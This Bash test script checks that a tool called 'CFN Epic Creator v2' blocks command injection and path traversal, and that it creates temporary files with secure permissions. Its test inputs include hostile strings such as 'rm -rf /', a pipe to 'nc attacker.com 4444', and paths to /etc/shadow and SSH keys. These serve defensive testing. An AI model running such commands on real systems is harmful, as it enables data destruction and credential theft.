#!/bin/bash
set -euo pipefail

# Security test script for CFN Epic Creator v2
# Tests that all security vulnerabilities have been fixed

# Source security utilities
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECURITY_UTILS="$(realpath "${SCRIPT_DIR}/security-utils.sh")"

if [[ -f "$SECURITY_UTILS" ]]; then
    # shellcheck source=security-utils.sh
    source "$SECURITY_UTILS"
else
    echo "Error: Security utilities not found at $SECURITY_UTILS" >&2
    exit 1
fi

# Test configuration
TEST_EPIC_DIR="$(mktemp -d)"

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Test reporting
log_test() {
    echo "[TEST] $1"
    ((TESTS_RUN++))
}

log_pass() {
    echo "[PASS] $1"
    ((TESTS_PASSED++))
}

log_fail() {
    echo "[FAIL] $1"
    ((TESTS_FAILED++))
}

# Test functions
test_input_sanitization() {
    log_test "Testing input sanitization..."

    # Test command injection attempts
    local -a malicious_inputs=(
        "test epic; rm -rf /"
        "test epic && cat /etc/passwd"
        "test epic \$(whoami)"
        "test epic \`id\`"
        "test epic | nc attacker.com 4444"
    )

    for input in "${malicious_inputs[@]}"; do
        if ! check_command_injection "$input"; then
            log_pass "Blocked malicious input: $(printf '%s' "$input" | head -c 30)..."
        else
            log_fail "Failed to block malicious input: $(printf '%s' "$input" | head -c 30)..."
        fi
    done

    # Test valid input
    if validate_epic_description "This is a valid epic description with normal characters"; then
        log_pass "Accepted valid epic description"
    else
        log_fail "Rejected valid epic description"
    fi
}

test_path_traversal_protection() {
    log_test "Testing path traversal protection..."

    # Test path traversal attempts
    local -a malicious_paths=(
        "../../../etc/passwd"
        "/etc/shadow"
        "~/.ssh/id_rsa"
        "../../root/.bashrc"
        "/proc/version"
        "test/../../../etc/passwd"
    )

    for path in "${malicious_paths[@]}"; do
        if ! validate_path "$path" "$TEST_EPIC_DIR" >/dev/null 2>&1; then
            log_pass "Blocked malicious path: $path"
        else
            log_fail "Allowed malicious path: $path"
        fi
    done

    # Test valid path
    if valid_path=$(validate_path "output.json" "$TEST_EPIC_DIR"); then
        log_pass "Accepted valid path: $valid_path"
    else
        log_fail "Rejected valid path"
    fi
}

test_secure_temp_file_creation() {
    log_test "Testing secure temporary file creation..."

    # Create temporary file
    local temp_file
    temp_file=$(create_secure_temp "test" "tmp")

    # Check file exists
    if [[ -f "$temp_file" ]]; then
        log_pass "Temporary file created: $temp_file"

        # Check permissions
        local perms
        perms=$(stat -c%a "$temp_file" 2>/dev/null || stat -f%Lp "$temp_file" 2>/dev/null)
        if [[ "$perms" == "600" ]]; then
            log_pass "Temporary file has secure permissions: $perms"
        else
            log_fail "Temporary file has insecure permissions: $perms"
        fi

        # Cleanup
        rm -f "$temp_file"
    else
        log_fail "Failed to create temporary file"
    fi
}

# Main test execution
main() {
    echo "===================================="
    echo "CFN Epic Creator Security Test Suite"
    echo "===================================="
    echo ""

    # Run tests
    test_input_sanitization
    test_path_traversal_protection
    test_secure_temp_file_creation

    # Report results
    echo ""
    echo "===================================="
    echo "Test Results"
    echo "===================================="
    echo "Tests run: $TESTS_RUN"
    echo "Passed: $TESTS_PASSED"
    echo "Failed: $TESTS_FAILED"

    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo ""
        echo "All security tests passed!"
        echo "The epic-creator-v2 implementation is secure."
    else
        echo ""
        echo "Some security tests failed!"
        echo "Please review and fix the remaining issues."
        exit 1
    fi

    # Cleanup
    rm -rf "$TEST_EPIC_DIR"
}

# Run tests
main "$@"
